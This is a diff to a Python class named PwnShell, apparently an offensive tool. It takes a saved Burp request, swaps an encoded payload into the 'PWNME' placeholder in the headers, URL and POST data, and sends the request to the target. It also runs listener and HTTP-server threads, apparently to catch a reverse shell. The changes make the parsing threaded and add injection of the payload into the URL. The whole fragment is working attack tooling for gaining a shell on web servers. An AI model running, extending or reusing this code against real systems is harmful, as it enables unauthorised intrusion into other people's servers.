@@ -55,7 +55,6 @@ class PwnShell:
 
     def shell_linux(self):  # Default option
         self.info()
-        self.parse_file()
         # self.login()
         self.is_valid()
         self.thread()  # leave it the last one
@@ -115,12 +114,16 @@ class PwnShell:
         listen = Thread(target=self.listener)
         sendpayload = Thread(target=self.send_payload)
         httpserver = Thread(target=self.http_server)
+        burp= Thread(target=self.parse_file)
         listen.daemon = True
         sendpayload.daemon = True
         httpserver.daemon = True
+        burp.daemon=True
+        burp.start()
         listen.start()
         sendpayload.start()
         httpserver.start()
+        burp.join()
         httpserver.join()
         listen.join()
         sendpayload.join()
@@ -207,17 +210,21 @@ class PwnShell:
                     request[r] = request[r].replace("PWNME", encoded_payload)  # THE PAYLOAD
                 if r == "Host":
                     url = 'http://'+ request[r] + burpee.get_method_path(self.file)  #CONCATE WITH PATH
-                    print(url)
+                    
             if post_data:
+                url = url.replace("PWNME", encoded_payload)
                 post_data = post_data.replace("PWNME", encoded_payload)
                 req =requests.post(url,headers=request,data=post_data,verify=False)
                 print(req.status_code)
-                print()
+                print(encoded_payload)
             else:
+                url = url.replace("PWNME", encoded_payload)
                 req = requests.get(url,headers=request,verify=False)
                 print(req.status_code)
+                print(url)
             time.sleep(5)
             if self.is_port_in_use():
+                print("the port is in use")
                 break
 
     #########################################################################################
